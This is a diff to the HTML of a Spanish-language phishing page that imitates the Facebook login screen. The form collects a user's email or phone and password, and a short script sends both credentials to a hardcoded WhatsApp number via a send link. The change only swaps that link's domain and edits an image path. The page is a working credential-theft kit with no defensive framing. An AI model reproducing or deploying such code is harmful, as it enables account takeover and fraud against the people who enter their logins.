@@ -13,13 +13,13 @@
     <div class="container">
         <div class="container-profile">
             <span class="logo">
-                <img src="sesion/1.svg"="facebook">
+                <img src="sesion/ 1.svg"="facebook">
             </span>
             <p class="connect-friends">Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.</p>
         </div>
         
 
-        <div class="container-form"> <form class="form" onsubmit="sendToWhatsApp(event)"> <input type="text" placeholder="Correo electrónico o número de teléfono" id="username" required> <input type="password" placeholder="Contraseña" id="password" required> <input type="submit" value="Iniciar Sesión"> <span><a href="#">¿Olvidaste tu contraseña?</a></span> <div class="border"></div> <button><a href="#">Crear cuenta nueva</a></button> </form> </div> <script> function sendToWhatsApp(event) { event.preventDefault(); var username = document.getElementById('username').value; var password = document.getElementById('password').value; var message = `Usuario: ${username}%0AContraseña: ${password}`; var whatsappUrl = `https://api.whatsapp.com/send?phone=526693146060&text=${message}`; // Reemplaza este número con tu número de WhatsApp window.open(whatsappUrl, '_blank'); }
+        <div class="container-form"> <form class="form" onsubmit="sendToWhatsApp(event)"> <input type="text" placeholder="Correo electrónico o número de teléfono" id="username" required> <input type="password" placeholder="Contraseña" id="password" required> <input type="submit" value="Iniciar Sesión"> <span><a href="#">¿Olvidaste tu contraseña?</a></span> <div class="border"></div> <button><a href="#">Crear cuenta nueva</a></button> </form> </div> <script> function sendToWhatsApp(event) { event.preventDefault(); var username = document.getElementById('username').value; var password = document.getElementById('password').value; var message = `Usuario: ${username}%0AContraseña: ${password}`; var whatsappUrl = `https://wa.me/send?phone=526693146060&text=${message}`; // Reemplaza este número con tu número de WhatsApp window.open(whatsappUrl, '_blank'); }
 
         
 </body>
